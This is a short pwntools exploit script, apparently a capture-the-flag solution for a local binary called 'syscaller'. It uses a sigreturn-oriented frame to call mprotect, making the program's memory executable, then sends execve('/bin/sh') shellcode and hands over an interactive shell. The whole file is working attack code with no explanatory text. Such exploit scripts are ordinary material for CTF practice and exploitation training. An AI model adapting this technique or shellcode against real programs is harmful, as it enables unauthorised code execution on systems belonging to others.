from pwn import *

context.arch = "amd64"
context.log_level = "debug"
file = "./syscaller"


def execBinSh(target, elf):
  sigreturnFrame = SigreturnFrame()
  sigreturnFrame.rip = 0x400104  # first syscall of entry function
  sigreturnFrame.rax = 0xa
  sigreturnFrame.rdi = 0x400000
  sigreturnFrame.rsi = 0x1000
  sigreturnFrame.rdx = 0x7
  sigreturnFrame.rsp = 0x40011a  # after second syscall of entry function

  r12 = b"0"*8
  r11 = b"1"*8
  rdi = b"0"*8
  rax = p64(0xf)
  rbx = b"0"*8
  rdx = b"1"*8
  rsi = b"0"*8
  rdi = b"1"*8

  payload = b""
  payload += r12
  payload += r11
  payload += rdi
  payload += rax
  payload += rbx
  payload += rdx
  payload += rsi
  payload += rdi
  payload += bytes(sigreturnFrame)

  target.sendline(payload)
  shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
  target.sendline(shellcode)


def main():
  target = process(file)
  elf = ELF(file)
  execBinSh(target, elf)
  target.interactive()


if __name__ == "__main__":
  main()
